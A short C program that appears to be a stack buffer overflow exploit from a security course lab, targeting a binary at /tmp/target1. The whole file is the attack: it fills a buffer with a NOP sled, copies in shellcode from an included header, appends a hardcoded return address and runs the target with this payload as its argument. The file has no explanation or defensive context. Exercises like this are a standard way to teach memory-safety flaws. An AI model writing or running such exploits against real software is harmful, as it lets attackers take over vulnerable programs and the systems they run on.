#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];

  char attack[248];
  char ret[] = "\xb8\xfc\xff\xbf";
  memset(attack, 0x90, 199);
  memcpy(attack + 199, shellcode, 45);
  memcpy(attack + 244, ret, 4);
 
  args[0] = TARGET; args[1] = attack; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
